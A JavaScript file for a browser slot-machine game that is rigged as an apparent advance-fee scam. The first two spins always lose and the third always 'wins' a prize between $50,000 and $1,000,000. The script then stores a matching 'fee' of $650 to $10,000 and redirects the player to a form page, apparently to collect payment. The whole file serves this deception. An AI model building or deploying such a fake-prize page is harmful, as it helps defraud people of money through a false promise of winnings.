const SLOTS_PER_REEL = 12;
const REEL_RADIUS = 150;
const prizes = [
    "$50,000.00", "$100,000.00", "$125,000.00", "$150,000.00", "$175,000.00",
    "$200,000.00", "$250,000.00", "$300,000.00", "$450,000.00", "$500,000.00",
    "$600,000.00", "$800,000.00", "$850,000.00", "$900,000.00", "$1,000,000.00"
];

const fees = {
    "$50,000.00": "$650", "$100,000.00": "$1000", "$125,000.00": "$1250",
    "$150,000.00": "$1500", "$175,000.00": "$1750", "$200,000.00": "$2000",
    "$250,000.00": "$2500", "$300,000.00": "$3000", "$450,000.00": "$4500",
    "$500,000.00": "$5000", "$600,000.00": "$6000", "$800,000.00": "$8000",
    "$850,000.00": "$8500", "$900,000.00": "$9000", "$1,000,000.00": "$10000"
};

let gameCount = 0;

function createSlots(ring) {
    const slotAngle = 360 / SLOTS_PER_REEL;
    const seed = getSeed();

    for (let i = 0; i < SLOTS_PER_REEL; i++) {
        const slot = document.createElement('div');
        slot.className = 'slot';
        const transform = `rotateX(${slotAngle * i}deg) translateZ(${REEL_RADIUS}px)`;
        slot.style.transform = transform;
        slot.innerHTML = `<p>${prizes[(seed + i) % prizes.length]}</p>`;
        ring.appendChild(slot);
    }
}

function getSeed() {
    return Math.floor(Math.random() * SLOTS_PER_REEL);
}

// Initialize the rings
document.querySelectorAll('.ring').forEach(createSlots);

const spinButton = document.getElementById('spin-button');
const resultDisplay = document.getElementById('result');

// Handle spin logic
spinButton.addEventListener('click', () => {
    gameCount++;
    if (gameCount <= 3) {
        playGame(gameCount);
    } else {
        resultDisplay.textContent = "Game Over! Refresh to play again.";
    }
});

function playGame(round) {
    resultDisplay.textContent = `Spinning...`;
    const results = [];

    document.querySelectorAll('.ring').forEach(ring => {
        const seed = getSeed();
        const angle = Math.floor(seed * (360 / SLOTS_PER_REEL));
        ring.style.transform = `rotateX(-${angle}deg)`;
        results.push(prizes[seed]);
    });

    setTimeout(() => {
        if (round === 1 || round === 2) {
            resultDisplay.innerHTML = `Round ${round}: <b>You Lose</b>. Try again!`;
        } else {
            const prize = results[0]; // Use the first ring's result as the prize
            const fee = fees[prize] || "N/A";
            resultDisplay.innerHTML = `Round ${round}: <b>You Win!</b> Prize: ${prize}`;

            // Save details in localStorage
            localStorage.setItem("winnerName", "Player 1");
            localStorage.setItem("winnerAmount", prize);
            localStorage.setItem("winnerFee", fee);

            // Redirect after showing result
            setTimeout(() => {
                resultDisplay.innerHTML += "<br>Loading...";
                setTimeout(() => {
                    window.location.href = "form.html";
                }, 10000);
            }, 2000);
        }
    }, 3000);
}